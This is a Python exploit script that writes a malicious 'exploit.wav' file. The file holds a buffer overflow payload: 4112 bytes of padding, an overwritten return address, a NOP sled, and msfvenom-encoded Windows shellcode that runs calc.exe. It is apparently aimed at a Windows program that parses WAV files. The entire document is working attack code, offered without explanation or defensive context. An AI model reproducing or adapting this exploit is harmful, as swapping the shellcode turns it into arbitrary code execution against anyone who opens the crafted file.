from struct import pack

def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
    buf =  b""
    buf += b"\xda\xc8\xd9\x74\x24\xf4\x58\x33\xc9\xbe\x0e\x78\x5e"
    buf += b"\xba\xb1\x31\x83\xc0\x04\x31\x70\x14\x03\x70\x1a\x9a"
    buf += b"\xab\x46\xca\xd8\x54\xb7\x0a\xbd\xdd\x52\x3b\xfd\xba"
    buf += b"\x17\x6b\xcd\xc9\x7a\x87\xa6\x9c\x6e\x1c\xca\x08\x80"
    buf += b"\x95\x61\x6f\xaf\x26\xd9\x53\xae\xa4\x20\x80\x10\x95"
    buf += b"\xea\xd5\x51\xd2\x17\x17\x03\x8b\x5c\x8a\xb4\xb8\x29"
    buf += b"\x17\x3e\xf2\xbc\x1f\xa3\x42\xbe\x0e\x72\xd9\x99\x90"
    buf += b"\x74\x0e\x92\x98\x6e\x53\x9f\x53\x04\xa7\x6b\x62\xcc"
    buf += b"\xf6\x94\xc9\x31\x37\x67\x13\x75\xff\x98\x66\x8f\xfc"
    buf += b"\x25\x71\x54\x7f\xf2\xf4\x4f\x27\x71\xae\xab\xd6\x56"
    buf += b"\x29\x3f\xd4\x13\x3d\x67\xf8\xa2\x92\x13\x04\x2e\x15"
    buf += b"\xf4\x8d\x74\x32\xd0\xd6\x2f\x5b\x41\xb2\x9e\x64\x91"
    buf += b"\x1d\x7e\xc1\xd9\xb3\x6b\x78\x80\xd9\x6a\x0e\xbe\xaf"
    buf += b"\x6d\x10\xc1\x9f\x05\x21\x4a\x70\x51\xbe\x99\x35\xad"
    buf += b"\xf4\x80\x1f\x26\x51\x51\x22\x2b\x62\x8f\x60\x52\xe1"
    buf += b"\x3a\x18\xa1\xf9\x4e\x1d\xed\xbd\xa3\x6f\x7e\x28\xc4"
    buf += b"\xdc\x7f\x79\xa7\x83\x13\xe1\x06\x26\x94\x80\x56"
    offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf
    with open('exploit.wav', 'wb') as f:
        f.write(payload)

exploit()
